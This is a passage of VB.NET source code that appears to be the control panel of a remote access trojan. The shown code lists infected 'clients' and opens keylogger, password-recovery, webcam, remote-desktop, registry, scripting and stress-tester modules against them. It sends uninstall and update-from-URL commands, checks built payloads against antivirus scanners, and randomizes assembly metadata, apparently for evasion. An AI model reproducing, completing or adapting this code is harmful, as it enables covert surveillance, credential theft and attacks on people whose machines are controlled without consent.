                    groupArray(i) = New BetterListViewGroup(Conversions.ToString(list.Item(i)))
                    groupArray(i).Font = (New Font("Verdana", 10.0!))
                    i += 1
                Loop
                Dim item2 As BetterListViewItem
                For Each item2 In Me.LV_Clients.Items
                    Dim num5 As Integer = num
                    Dim j As Integer = 0
                    Do While (j <= num5)
                        If (groupArray(j).Header = item2.SubItems.Item(6).Text) Then
                            item2.Group = (groupArray(j))
                            Me.LV_Clients.Groups.Add(groupArray(j))
                            Me.LV_Clients.Items.Add(item2)
                        End If
                        j += 1
                    Loop
                Next
                Me.LV_Clients.ShowGroups = (True)
                Me.called(2) = True
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub PasswordRecoveryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordRecoveryToolStripMenuItem.Click
        Try
            My.Forms.PasswordRecovery.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.PasswordRecovery.Text = ("Password Recovery - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.PasswordRecovery.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub PictureBox1_DoubleClick(sender As Object, e As EventArgs) Handles PictureBox1.DoubleClick
        Try
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Multiselect = False
                dialog2.Filter = "Icons | *.ico"
                dialog2.Title = "Select an icon..."
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    Me.PictureBox1.Image = Image.FromFile(dialog.FileName)
                    Me.PictureBox1.Tag = dialog.FileName
                End If
                dialog2 = Nothing
            End Using
        Catch exception1 As Exception

        End Try
    End Sub
    Private Function ping(ByVal address As String) As Integer
        Dim roundtripTime As Integer
        Try
            Dim pingg As New Ping
            roundtripTime = CInt(pingg.Send(address).RoundtripTime)
        Catch exception1 As Exception
            roundtripTime = Conversions.ToInteger("")
            Return roundtripTime
        End Try
        Return roundtripTime
    End Function

    Private Sub PingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PingToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator(Of BetterListViewItem)
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Try
                enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As BetterListViewItem = enumerator.Current
                    Dim reply As PingReply = New Ping().Send(NewLateBinding.LateGet(NewLateBinding.LateGet(current.Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
                    current.SubItems.Item(11).Text = ((Conversions.ToString(CInt(reply.RoundtripTime)) & " ms"))
                Loop
            Finally

            End Try
        Catch exception1 As Exception

        End Try
    End Sub
    Public Function PreFilterMessage(ByRef m As Message) As Boolean Implements IMessageFilter.PreFilterMessage
        If (m.Msg = &H233) Then
            Dim num3 As Integer = FormMain.DragQueryFile(m.WParam, -1, Nothing, 0)
            Dim i As Integer = 0
            Do While (i <= num3)
                Dim fname As New StringBuilder(&H100)
                FormMain.DragQueryFile(m.WParam, i, fname, &H100)
                Me.HandleDroppedFiles(fname.ToString)
                i += 1
            Loop
            FormMain.DragFinish(m.WParam)
            Return True
        End If
        Return False
    End Function

    Private Sub PrivilegsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PrivilegsToolStripMenuItem.Click
        Try
            Me.LV_Clients.Groups.Clear()
            If Not Me.called(4) Then
                Dim list As New ArrayList
                Dim item As BetterListViewItem
                For Each item In Me.LV_Clients.Items
                    If Not list.Contains(item.SubItems.Item(9).Text) Then
                        list.Add(item.SubItems.Item(9).Text)
                    End If
                Next
                Dim num As Integer = (list.Count - 1)
                Dim groupArray As BetterListViewGroup() = New BetterListViewGroup((num + 1) - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    groupArray(i) = New BetterListViewGroup(Conversions.ToString(list.Item(i)))
                    groupArray(i).Font = (New Font("Verdana", 10.0!))
                    i += 1
                Loop
                Dim item2 As BetterListViewItem
                For Each item2 In Me.LV_Clients.Items
                    Dim num5 As Integer = num
                    Dim j As Integer = 0
                    Do While (j <= num5)
                        If (groupArray(j).Header = item2.SubItems.Item(9).Text) Then
                            item2.Group = (groupArray(j))
                            Me.LV_Clients.Groups.Add(groupArray(j))
                            Me.LV_Clients.Items.Add(item2)
                        End If
                        j += 1
                    Loop
                Next
                Me.LV_Clients.ShowGroups = (True)
                Me.called(4) = True
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton3.CheckedChanged
        If Me.RadioButton3.Checked Then
            Me.TextBox1.Enabled = True
        Else
            Me.TextBox1.Enabled = False
        End If
    End Sub

    Private Sub RegistryManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegistryManagerToolStripMenuItem.Click
        Try
            My.Forms.RegistryManager.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.RegistryManager.Text = ("Registry Manager - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.RegistryManager.Show()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub DesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DesktopToolStripMenuItem.Click
        Try
            My.Forms.RemoteDesktop.userclient = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.RemoteDesktop.Text = ("Remote Desktop - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.RemoteDesktop.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Try
            My.Forms.Keylogger.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.Keylogger.Text = ("Keylogger - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.Keylogger.Show()
        Catch ex As Exception
        End Try

    End Sub

    Private Sub WebcamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WebcamToolStripMenuItem.Click
        Try
            If (Me.LV_Clients.SelectedItems.Item(0).SubItems.Item(10).Text = "No") Then
                MessageBox.Show("You can not view the clients webcam since he / she does not have one!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Else
                My.Forms.RemoteWebcam.Text = ("Remote Webcam - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
                My.Forms.RemoteWebcam.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
                My.Forms.RemoteWebcam.Show()
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub RemoveClient(ByVal client As ServerClient)
        Try
            Dim item As BetterListViewItem
            For Each item In Me.LV_Clients.Items
                If (NewLateBinding.LateGet(NewLateBinding.LateGet(item.Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString = client.EndPoint.Address.ToString) Then
                    Me.LV_Clients.Items.Remove(item)
                End If
            Next
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator(Of BetterListViewItem)
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Try
                enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    NewLateBinding.LateCall(enumerator.Current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(69)})}, Nothing, Nothing, Nothing, True)
                Loop
            Finally

            End Try
        Catch exception1 As Exception

        End Try
    End Sub
    Public Sub RetrieveNews()
        Try
            Dim postMessage As String = LicenseGlobal.Seal.GetPostMessage(Me.ID)
            If Not String.IsNullOrEmpty(postMessage) Then
                Me.Invoke(New DelegateWriteOutput(AddressOf Me.writeoutput), New Object() {Me.rtb_news, postMessage})
            End If
        Catch exception1 As Exception

        End Try
    End Sub

    Public Shared Function RijndaelDecrypt(ByVal UDecryptU As String, ByVal UKeyU As String) As Object
        Dim managed As New RijndaelManaged
        Dim salt As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Dim bytes As New Rfc2898DeriveBytes(UKeyU, salt)
        managed.Key = bytes.GetBytes(managed.Key.Length)
        managed.IV = bytes.GetBytes(managed.IV.Length)
        Dim stream2 As New MemoryStream
        Dim stream As New CryptoStream(stream2, managed.CreateDecryptor, CryptoStreamMode.Write)
        Try
            Dim buffer As Byte() = Convert.FromBase64String(UDecryptU)
            stream.Write(buffer, 0, buffer.Length)
            stream.Close()
            UDecryptU = Encoding.UTF8.GetString(stream2.ToArray)
        Catch exception1 As Exception

        End Try
        Return UDecryptU
    End Function

    Private Sub Scan(ByVal path As String)
        Try
            Dim num2 As Integer
            Dim str As String = New AnonScanner(LicenseGlobal.Seal.GetVariable("scannerapi"), LicenseGlobal.Seal.GetVariable("scannerid")).Scan(path, "all")
            str = str.Remove(0, (str.IndexOf("results") + 10))
            str = str.Remove((str.Length - 2), 2)
            Dim index As Integer = 0
            Do
                Me.Invoke(New DelegateAddListViewItems(AddressOf Me.AddListViewItems), New Object() {str.Split(New Char() {","c})(index).Split(New Char() {":"c})(0).Replace("""", ""), str.Split(New Char() {","c})(index).Split(New Char() {":"c})(1).Replace("""", "").Replace("\", "")})
                index += 1
                num2 = &H26
            Loop While (index <= num2)
            Dim item As BetterListViewItem
            For Each item In Me.LV_Scanner.Items
                If (item.SubItems.Item(1).Text = "OK") Then
                    Me.Invoke(New DelegateChangeColor(AddressOf Me.ChangeColor), New Object() {item, Color.Green})
                Else
                    Me.Invoke(New DelegateChangeColor(AddressOf Me.ChangeColor), New Object() {item, Color.Red})
                End If
            Next
            Me.Invoke(New DelegateStopProgressbar(AddressOf Me.StopProgressbar))
            Me.Invoke(New DelegateCountDetection(AddressOf Me.CountDetection))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            MessageBox.Show(exception.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            Me.Invoke(New DelegateStopProgressbar(AddressOf Me.StopProgressbar))
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ScreenshotToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenshotToolStripMenuItem.Click
        Try
            My.Forms.ScreenshotManager.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.ScreenshotManager.Text = ("Screenshot Manager - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.ScreenshotManager.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub ScriptingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScriptingToolStripMenuItem.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            My.Forms.Scripting.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.Scripting.Text = ("Scripting - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.Scripting.Show()
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub SendToAll(ByVal ParamArray args As Object())
        Try
            Dim buffer As Byte() = Me.packer.Serialize(args)
            Dim item As BetterListViewItem
            For Each item In Me.LV_Clients.Items
                Dim arguments As Object() = New Object() {buffer}
                Dim copyBack As Boolean() = New Boolean() {True}
                NewLateBinding.LateCall(item.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    buffer = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                End If
            Next
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub

    Public Sub ShowNotification(ByVal country As String, ByVal ip As String, ByVal name As String, ByVal flag As Integer)
        My.Forms.Notification.PictureBox2.Image = Me.IL_CountryFlags.Images.Item(flag)
        My.Forms.Notification.lbl_location.Text = country
        My.Forms.Notification.lbl_ip.Text = ip
        My.Forms.Notification.lbl_name.Text = name
        My.Forms.Notification.Show()
    End Sub
    Private Sub StopProgressbar()
        Me.ProgressBar1.Style = ProgressBarStyle.Continuous
        Me.ProgressBar1.MarqueeAnimationSpeed = 0
    End Sub


    Private Sub StressTesterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StressTesterToolStripMenuItem.Click
        Try
            Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
            Dim item As BetterListViewItem
            For Each item In Me.LV_Clients.SelectedItems
                My.Forms.StressTester.clients.Add(RuntimeHelpers.GetObjectValue(item.Tag))
            Next
            My.Forms.StressTester.Show()
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub Sub_ResizeImage(ByVal sender As Object, ByVal e As EventArgs)
        Me.h = Me.previewimage.Size.Height
        Me.w = Me.previewimage.Size.Width
    End Sub

    Private Sub Sub_ResizeText(ByVal sender As Object, ByVal e As EventArgs)
        Me.h = Me.previewtext.Size.Height
        Me.w = Me.previewtext.Size.Width
    End Sub

    Private Sub Tabcontrol1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Tabcontrol1.SelectedIndexChanged
        Try
            If (Me.Tabcontrol1.SelectedIndex = 5) Then
                Dim point2 As New Point(0, 0)
                Me.ImageListView1.Size = Me.Panel2.Size
            ElseIf (Me.Tabcontrol1.SelectedIndex = 2) Then
                Me.nud_port.Value = New Decimal(Conversions.ToInteger(Me.LV_Ports.Items.Item(0).Text))
                Me.LinkLabel1_LinkClicked(Nothing, Nothing)
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Private Sub ThumbnailPreview(ByVal content As Byte(), ByVal id As String)
        Try
            Dim size2 As Size
            Dim point2 As Point
            If (id = "Other") Then
                My.Forms.FileManager.TP_FM.Controls.Remove(Me.previewtext)
                My.Forms.FileManager.TP_FM.Controls.Remove(Me.previewimage)
                Me.previewtext = New RichTextBox
                AddHandler Me.previewtext.Resize, New EventHandler(AddressOf Me.Sub_ResizeText)
                size2 = New Size(Conversions.ToInteger(Interaction.IIf((Me.w = 0), &H12F, Me.w)), Conversions.ToInteger(Interaction.IIf((Me.h = 0), &H166, Me.h)))
                Me.previewtext.Size = size2
                point2 = New Point(&H2CB, &H27)
                Me.previewtext.Location = point2
                Me.previewtext.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or (AnchorStyles.Bottom Or AnchorStyles.Top)))
                Me.previewtext.Text = Encoding.UTF8.GetString(content)
                My.Forms.FileManager.TP_FM.Controls.Add(Me.previewtext)
            ElseIf (id = "Image") Then
                My.Forms.FileManager.TP_FM.Controls.Remove(Me.previewimage)
                My.Forms.FileManager.TP_FM.Controls.Remove(Me.previewtext)
                Me.previewimage = New PictureBox
                AddHandler Me.previewimage.Resize, New EventHandler(AddressOf Me.Sub_ResizeImage)
                size2 = New Size(Conversions.ToInteger(Interaction.IIf((Me.w = 0), &H12F, Me.w)), Conversions.ToInteger(Interaction.IIf((Me.h = 0), &H166, Me.h)))
                Me.previewimage.Size = size2
                point2 = New Point(&H2CB, &H27)
                Me.previewimage.Location = point2
                Me.previewimage.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or (AnchorStyles.Bottom Or AnchorStyles.Top)))
                Me.previewimage.SizeMode = PictureBoxSizeMode.StretchImage
                Me.previewimage.Image = Image.FromStream(New MemoryStream(content))
                My.Forms.FileManager.TP_FM.Controls.Add(Me.previewimage)
            End If
            GC.Collect()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Try
            Dim enumerator As IEnumerator(Of BetterListViewItem)
            Try
                enumerator = Me.LV_OnConnect.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    enumerator.Current.Remove()
                Loop
            Finally

            End Try
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub TorrentSeederToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TorrentSeederToolStripMenuItem.Click
        Try
            Dim item As BetterListViewItem
            For Each item In Me.LV_Clients.SelectedItems
                My.Forms.TorrentSeeder.clients.Add(RuntimeHelpers.GetObjectValue(item.Tag))
            Next
            My.Forms.TorrentSeeder.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub TrollFunFunctionsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TrollFunFunctionsToolStripMenuItem.Click
        Try
            My.Forms.FunManager.client = DirectCast(Me.LV_Clients.SelectedItems.Item(0).Tag, ServerClient)
            My.Forms.FunManager.Text = ("Fun Manager - " & NewLateBinding.LateGet(NewLateBinding.LateGet(Me.LV_Clients.SelectedItems.Item(0).Tag, Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString)
            My.Forms.FunManager.Show()
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim enumerator As IEnumerator(Of BetterListViewItem)
        Try
            enumerator = Me.LV_Clients.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim obj2 As Object = Me.LV_Clients.SelectedItems.Item(0)
                Try
                    Dim dr As DialogResult = MessageBox.Show("Are you sure to want to Uninstall Server ?", "Uninstall", MessageBoxButtons.YesNo)
                    If dr = DialogResult.Yes Then
                        NewLateBinding.LateCall(enumerator.Current.Tag, Nothing, "Send", New Object() {New Pack().Serialize(New Object() {CByte(53)})}, Nothing, Nothing, Nothing, True)
                        For Each i As BetterListViewItem In LV_Clients.SelectedItems
                            LV_Clients.Items.Remove(i)
                        Next
                    End If
                    Continue Do
                Catch ex As Exception
                    Continue Do
                End Try
            Loop
        Catch ex As Exception
        End Try
    End Sub
    Private Sub updatefile(ByVal actionfor As String)
        Using dialog As OpenFileDialog = New OpenFileDialog
            Dim dialog2 As OpenFileDialog = dialog
            dialog2.Filter = "Executables | *.exe"
            dialog2.InitialDirectory = Application.StartupPath
            dialog2.Multiselect = False
            dialog2.Title = "Select a file..."
            If (dialog2.ShowDialog = DialogResult.OK) Then
                dialog2 = Nothing
                Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 3)
                item.SubItems.Add(dialog.FileName)
                item.SubItems.Add(actionfor)
                item = Nothing
            End If
        End Using
    End Sub

    Private Sub updateurl(ByVal actionfor As String)
        Dim str As String = Interaction.InputBox("Please enter a valid direct .exe link to your updated server!", "Update Server from URL", "", -1, -1)
        If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
            Dim item As BetterListViewItem = Me.LV_OnConnect.Items.Add(Me.ComboBox1.SelectedItem.ToString, 2)
            item.SubItems.Add(str)
            item.SubItems.Add(actionfor)
            item = Nothing
        End If
    End Sub

    Public Sub writeoutput(ByVal rtb As RichTextBox, ByVal [text] As String)
        Dim box As RichTextBox = rtb
        box.Text = (box.Text & [text] & ChrW(13) & ChrW(10))
    End Sub

    Private Property listener() As ServerListener
        <DebuggerNonUserCode()>
        Get
            Return Me._listener
        End Get
        <DebuggerNonUserCode()>
        <MethodImpl(MethodImplOptions.Synchronized)>
        Set(value As ServerListener)
            Dim obj As ServerListener.StateChangedEventHandler = AddressOf Me.listener_StateChanged
            Dim obj2 As ServerListener.ExceptionThrownEventHandler = AddressOf Me.listener_ExceptionThrown
            Dim obj3 As ServerListener.ClientStateChangedEventHandler = AddressOf Me.listener_ClientStateChanged
            Dim obj4 As ServerListener.ClientReadPacketEventHandler = AddressOf Me.listener_ClientReadPacket
            Dim obj5 As ServerListener.ClientExceptionThrownEventHandler = AddressOf Me.listener_ClientExceptionThrown
            Dim flag As Boolean = Me._listener IsNot Nothing
            If flag Then
                RemoveHandler Me._listener.StateChanged, obj
                RemoveHandler Me._listener.ExceptionThrown, obj2
                RemoveHandler Me._listener.ClientStateChanged, obj3
                RemoveHandler Me._listener.ClientReadPacket, obj4
                RemoveHandler Me._listener.ClientExceptionThrown, obj5
            End If
            Me._listener = value
            flag = (Me._listener IsNot Nothing)
            If flag Then
                AddHandler Me._listener.StateChanged, obj
                AddHandler Me._listener.ExceptionThrown, obj2
                AddHandler Me._listener.ClientStateChanged, obj3
                AddHandler Me._listener.ClientReadPacket, obj4
                AddHandler Me._listener.ClientExceptionThrown, obj5
            End If
        End Set
    End Property

    Public Overridable Property messageboxresult As TextBox
        <DebuggerNonUserCode> _
        Get
            Return Me._messageboxresult
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As TextBox)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.messageboxresult_TextChanged)
            If (Not Me._messageboxresult Is Nothing) Then
                RemoveHandler Me._messageboxresult.TextChanged, handler
            End If
            Me._messageboxresult = WithEventsValue
            If (Not Me._messageboxresult Is Nothing) Then
                AddHandler Me._messageboxresult.TextChanged, handler
            End If
        End Set
    End Property


    Private _listener As ServerListener
    Private sw As Stopwatch
    Private swwebcam As Stopwatch
    Private count As Long
    Private webcamcount As Long
    Public path As String
    Private called As Boolean()
    Private Groups As BetterListViewGroup()
    Private alreadygroup As Boolean
    <AccessedThroughProperty("messageboxresult")>
    Private _messageboxresult As TextBox
    Public previewtext As RichTextBox
    Public previewimage As PictureBox
    Public h As Integer
    Public w As Integer
    Private btnthumbnailclicked As Boolean
    Private Thread_Scanning As Thread
    Private TR_Process As Thread
    Private TR_Software As Thread
    Private TR_Connection As Thread
    Private TR_Service As Thread
    Private TR_Window As Thread
    Private TR_Compile As Thread
    Private TR_GetIP As Thread
    Private ID As Integer
    Private retrieve As Thread
    Public Const WM_DROPFILES As Integer = 563
    Private packer As Pack
    ' Nested Types
    Public Delegate Sub DelegateAddImage(params As Byte())

    Public Delegate Sub DelegateAddMonitorCount(count As Integer)

    Public Delegate Sub DelegateAddPCBounds(width As Integer, height As Integer)

    Public Delegate Sub DelegateShowNotification(country As String, ip As String, name As String, flag As Integer)

    Public Delegate Sub DelegateAddDrives(params As String)

    Public Delegate Sub DelegateAddFiles(params As String)

    Public Delegate Sub DelegateAddException(location As String, ex As String)

    Public Delegate Sub DelegateThumbnailPreview(content As Byte(), id As String)

    Public Delegate Sub DelegateAddkeylogs(logs As String)

    Public Delegate Sub DelegateHandleMicrophone(byt As Byte())

    Public Delegate Sub DelegateAddSysManagerInfo(a1 As String, a2 As String, a3 As String, a4 As String, a5 As String, a6 As String, a7 As String, a8 As String, a9 As String, a10 As String, a11 As String, a12 As String, a13 As String, a14 As String, a15 As String, a16 As String, a17 As String, a18 As String, a19 As String, a20 As String, a21 As String, a22 As String, client As ServerClient)

    Public Delegate Sub DelegateHandleProcess(args As String)

    Public Delegate Sub DelegateAddSoftware(txt As String)

    Public Delegate Sub DelegateAddConnection(txt As String)

    Public Delegate Sub DelegateAddStartup(txt As String)

    Public Delegate Sub DelegateAddService(txt As String)

    Public Delegate Sub DelegateAddCMD(txt As String)

    Public Delegate Sub DelegateGetCP(txt As String)

    Public Delegate Sub DelegateAddHostsFile(txt As String)

    Public Delegate Sub DelegateAddPasswords(txt As String, client As ServerClient)

    Public Delegate Sub DelegateAddChatMessage(txt As String, client As ServerClient)

    Public Delegate Sub DelegateAddScreenshot(byt As Byte())

    Public Delegate Sub DelegateAddMonitorCount2(count As Integer)

    Public Delegate Sub DelegateUpdaterShow()

    Public Delegate Sub DelegateAddWindows(txt As String)

    Public Delegate Sub DelegateAddWebcam(img As Byte())

    Public Delegate Sub DelegateAddWebcamDevices(txt As String)

    Public Delegate Sub DelegateAddRegistryKeys(keys As String)

    Public Delegate Sub DelegateAddRegistryValues(values As String)

    Public Delegate Sub DelegateAddWebcamThumbNail(client As ServerClient, img As Byte())

    Public Delegate Sub DelegateAddDesktopThumbNail(client As ServerClient, img As Byte())

    Public Delegate Sub DelegateAddListViewItems(itm As String, subitem As String)

    Public Delegate Sub DelegateChangeColor(l As BetterListViewItem, color As Color)

    Public Delegate Sub DelegateStopProgressbar()

    Public Delegate Sub DelegateCountDetection()

    Public Delegate Sub DelegateAddOutput(txt As String)

    Public Delegate Sub DelegateAddIp(ip As String)

    Public Delegate Sub Delegate_HandleProcess(args As String)

    Public Delegate Sub Delegate_AddSoftware(txt As String)

    Public Delegate Sub Delegate_AddConnection(txt As String)

    Public Delegate Sub Delegate_AddService(txt As String)

    Public Delegate Sub Delegate_AddWindows(txt As String)

    Public Delegate Sub DelegateWriteOutput(rtb As RichTextBox, text As String)

    Public Enum PacketHeaders As Byte
        ' Fields
        AddDesktopThumbNail = 132
        AddWebcamThumbNail = 131
        BatchScripting = 62
        ChangeWindowTitle = 111
        CloseWindow = 117
        Disconnect = 52
        DownloadFile = 9
        Drives = 6
        Exception = 8
        ExecuteFile = 55
        ExecuteURL = 54
        GetConnections = 33
        GetCP = 47
        GetInformation = 27
        Getlogs = 23
        GetPasswords = 51
        GetProcess = 28
        GetScreenshot = 107
        GetServices = 36
        GetSoftware = 31
        GetStartup = 34
        GetWebcam = 121
        GetWebcamDeviceNames = 122
        HideWindow = 112
        HTMLScripting = 61
        InputBox = 59
        ListFiles = 7
        ListSubKeys = 123
        ListValues = 124
        LoadHostsFile = 49
        MaxmizeWindow = 115
        MessageBox = 60
        MinimizeWindow = 114
        MonitorCount2 = 108
        MonitorCounts = 2
        NewConnection = 0
        PcBounds = 4
        RefreshWindow = 110
        RemoteChatMessage = 65
        RemoteDesktop = 1
        Restart = 69
        RestoreWindow = 116
        SendCMD = 46
        ShowThumbNail = 130
        ShowWindow = 113
        Status = 56
        StopRecording = 26
        Thumbnail = 21
        Uninstall = 53
        UpdateFile = 58
        UpdateURL = 57
        UploadFile = 13
        VBsScripting = 63
    End Enum

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Try
            Me.tb_assemblycompany.Text = Me.Generate
            Me.tb_assemblycopyright.Text = Me.Generate
            Me.tb_assemblydescription.Text = Me.Generate
            Me.tb_assemblyproduct.Text = Me.Generate
            Me.tb_assemblytitle.Text = Me.Generate
            Me.tb_assemblytrademark.Text = Me.Generate
            Me.NumericUpDown9.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown2.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown3.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown4.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown8.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown7.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown6.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
            Me.NumericUpDown5.Value = New Decimal((VBMath.Rnd * 999.0!))
            VBMath.Randomize()
        Catch exception1 As Exception

        End Try
    End Sub



    Private Sub Button_Thumbnail_Click(sender As Object, e As EventArgs) Handles Button_Thumbnail.Click
        If Me.btnthumbnailclicked Then
            Me.ImageListView1.Items.Clear()
            Me.Button_Thumbnail.Image = My.Resources.Normal
            Me.btnthumbnailclicked = False
        Else
            Me.SendToAll(New Object() {CByte(130), RuntimeHelpers.GetObjectValue(Interaction.IIf(Me.CB_Thumbnail_Desktop.Checked, True, False)), RuntimeHelpers.GetObjectValue(Interaction.IIf(Me.CB_Thumbnail_Webcam.Checked, True, False))})
            Me.Button_Thumbnail.Image = My.Resources.active
            Me.btnthumbnailclicked = True
        End If
    End Sub

    Private Sub Button_Thumbnail_MouseEnter(sender As Object, e As EventArgs) Handles Button_Thumbnail.MouseEnter
        If Not Me.btnthumbnailclicked Then
            Me.Button_Thumbnail.Image = My.Resources.Hover
        End If
